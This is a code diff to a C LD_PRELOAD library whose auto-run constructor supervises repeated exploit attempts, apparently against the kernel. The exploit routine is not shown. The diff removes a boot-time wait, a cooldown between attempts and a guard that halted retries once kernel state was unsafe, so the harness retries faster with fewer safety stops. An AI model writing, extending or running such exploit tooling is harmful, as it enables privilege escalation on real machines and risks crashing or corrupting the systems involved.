@@ -2,8 +2,6 @@
 
 #define DEFAULT_EXPLOIT_ATTEMPTS 16
 #define DEFAULT_PSELECT_DELAY_USEC 20000
-#define DEFAULT_BOOT_QUIET_SEC 20
-#define DEFAULT_ATTEMPT_COOLDOWN_MS 250
 
 static unsigned long long rmg_trace4_us(void) {
   struct timespec ts;
@@ -37,22 +35,6 @@ static int attempt_delay_usec(int base_delay, int attempt) {
   return delay < 0 ? 0 : delay;
 }
 
-static void wait_for_boot_quiet_window(void) {
-  int min_uptime = env_int("BOOT_QUIET_SEC", DEFAULT_BOOT_QUIET_SEC, 0, 300);
-  if (min_uptime <= 0)
-    return;
-  struct timespec uptime;
-  if (clock_gettime(CLOCK_BOOTTIME, &uptime) != 0)
-    return;
-  if (uptime.tv_sec >= min_uptime)
-    return;
-  time_t wait_sec = min_uptime - uptime.tv_sec;
-  pr_info("waiting for boot allocator quiet window seconds=%lld uptime=%lld\n",
-          (long long)wait_sec, (long long)uptime.tv_sec);
-  while (wait_sec > 0)
-    wait_sec = sleep((unsigned int)wait_sec);
-}
-
 __attribute__((constructor)) static void load(void) {
   static int started;
   if (started) {
@@ -60,15 +42,11 @@ __attribute__((constructor)) static void load(void) {
   }
   started = 1;
   set_unbuffer();
-  if (!getenv("SLIDE_ONLY"))
-    wait_for_boot_quiet_window();
 
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
   int base_delay = env_int(
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
-  int cooldown_ms = env_int(
-      "ATTEMPT_COOLDOWN_MS", DEFAULT_ATTEMPT_COOLDOWN_MS, 0, 5000);
   if (getenv("SLIDE_ONLY")) {
     max_attempts = 1;
   }
@@ -76,8 +54,8 @@ __attribute__((constructor)) static void load(void) {
   unsetenv("LD_PRELOAD");
   char *argv[] = {"preload.so", NULL};
 
-  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d cooldown_ms=%d\n",
-             getpid(), max_attempts, base_delay, cooldown_ms);
+  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d\n",
+             getpid(), max_attempts, base_delay);
 
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     int delay_usec = attempt_delay_usec(base_delay, attempt);
@@ -117,13 +95,6 @@ __attribute__((constructor)) static void load(void) {
       return;
     }
 
-    if (WIFEXITED(status) && WEXITSTATUS(status) == CFI_RETRY_BLOCKED_EXIT) {
-      pr_error("exploit attempt=%d/%d left kernel state that is unsafe to "
-               "retry; reclaim pages are held. reboot before trying again\n",
-               attempt, max_attempts);
-      return;
-    }
-
     if (WIFSIGNALED(status)) {
       pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                  attempt, max_attempts, WTERMSIG(status));
@@ -132,9 +103,6 @@ __attribute__((constructor)) static void load(void) {
                  attempt, max_attempts,
                  WIFEXITED(status) ? WEXITSTATUS(status) : status);
     }
-
-    if (attempt < max_attempts && cooldown_ms > 0)
-      usleep((useconds_t)cooldown_ms * 1000U);
   }
 
   pr_error("exploit failed after %d independent attempts\n", max_attempts);
